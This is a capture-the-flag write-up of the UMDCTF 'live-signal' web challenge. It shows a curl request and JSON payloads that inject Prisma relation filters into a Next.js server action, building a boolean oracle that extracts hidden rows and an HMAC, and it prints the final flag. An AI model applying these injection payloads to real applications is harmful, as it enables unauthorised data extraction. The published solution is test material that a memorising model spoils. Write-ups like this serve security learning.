# live-signal

Flag: `UMDCTF{z0d_1s_f0r_sc4r3dy_c4ts}`

## Summary

This was a Next.js web challenge. The bug was an unsafe server action behind each analyst page:

- the client only exposed `handle` and `tier`
- the backend accepted arbitrary Prisma-style filter objects
- extra keys like `signals.some(...)` were passed into the analyst relation filter

That turned the public `signalsByAnalyst()` endpoint into a boolean oracle over embargoed rows. After recovering the hidden signal tuple, submitting it to `/insiders` returned the flag directly.

## Recon

The site exposed only `80` and `443`, and the HTML showed a Next.js app.

On `/analyst/quant_sable`, the client bundle `/_next/static/chunks/0e5v1fwwbr5fg.js` contained:

```js
createServerReference("60a1ddfeb092ed787fb44362a27b61cff6e945d3d2", ..., "signalsByAnalyst")
```

and the insiders page bundle `/_next/static/chunks/0wui0x4id.11a.js` contained:

```js
createServerReference("783c22fa5f432da054e7f973cb1a827a956078d769", ..., "verifyInsider")
```

The analyst action used a plain JSON array body, so this was enough to query it directly:

```bash
curl -sk 'https://live-signal.challs.umdctf.io/analyst/quant_sable' \
  -X POST \
  -H 'Next-Action: 60a1ddfeb092ed787fb44362a27b61cff6e945d3d2' \
  -H 'Content-Type: text/plain;charset=UTF-8' \
  --data '[{"handle":"quant_sable"},25]'
```

That returned RSC data containing the public signal rows.

## Vulnerability

The key observation was that `handle` was not validated as a string. Prisma filter objects worked:

```json
[{"handle":{"in":["quant_sable","moon_vector"]}},25]
```

That meant the backend was effectively trusting the whole analyst filter object. Adding a new key like `signals` also worked, which gave a relation-filter oracle:

```json
[
  {
    "handle": "quant_sable",
    "signals": {
      "some": {
        "publishedAt": { "gt": "2026-04-25T00:00:00.000Z" }
      }
    }
  },
  25
]
```

Only `quant_sable` matched, so the hidden signal belonged to that analyst.

## Recovering the Hidden Tuple

I used the oracle to pin down the embargoed row:

- analyst: `quant_sable`
- ticker: `KXELECTION-28NOV`
- side: `NO`
- contract price: `41`

Examples:

```json
{
  "signals": {
    "some": {
      "publishedAt": { "gt": "2026-04-25T00:00:00.000Z" },
      "ticker": "KXELECTION-28NOV",
      "side": "NO",
      "contractPrice": 41
    }
  }
}
```

The remaining field was the 32-hex `signalHmac`. The endpoint rate-limited at `600 req/min/IP`, so the fastest stable approach was:

- recover a prefix with `startsWith`
- then switch to lexicographic range checks with `gte` / `lt`

This reconstructed:

```text
fc434bd5283de7356831a82e8838632c
```

## Final Step

The insiders action expected four positional arguments:

```json
["KXELECTION-28NOV", "NO", 41, "fc434bd5283de7356831a82e8838632c"]
```

Submitting them to:

- URL: `https://live-signal.challs.umdctf.io/insiders`
- `Next-Action: 783c22fa5f432da054e7f973cb1a827a956078d769`

returned:

```json
{"ok":true,"message":"Welcome to the inside.","flag":"UMDCTF{z0d_1s_f0r_sc4r3dy_c4ts}"}
```

## Notes

- `llms.txt` heavily hinted the intended path: relation-filter injection, nested predicates against `signals`, and crafted tuples to `/insiders`.
- `verifyInsider` itself rejected object inputs with `Malformed credentials.`, so the real exploit path was the analyst oracle, not direct filter injection into the final action.
